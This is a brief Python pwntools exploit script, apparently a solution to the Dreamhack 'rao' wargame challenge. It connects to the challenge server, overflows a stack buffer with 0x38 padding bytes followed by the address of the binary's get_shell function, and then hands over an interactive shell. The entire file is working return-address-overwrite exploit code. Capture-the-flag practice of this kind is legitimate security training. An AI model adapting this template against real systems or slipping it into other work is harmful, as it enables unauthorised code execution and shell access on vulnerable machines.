#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./rao',checksec=False)

r = remote('host3.dreamhack.games',10915)
# r = process(exe.path)

payload = b'A'*0x38 + p64(exe.sym['get_shell'])

r.sendlineafter(b'Input: ',payload)

r.interactive()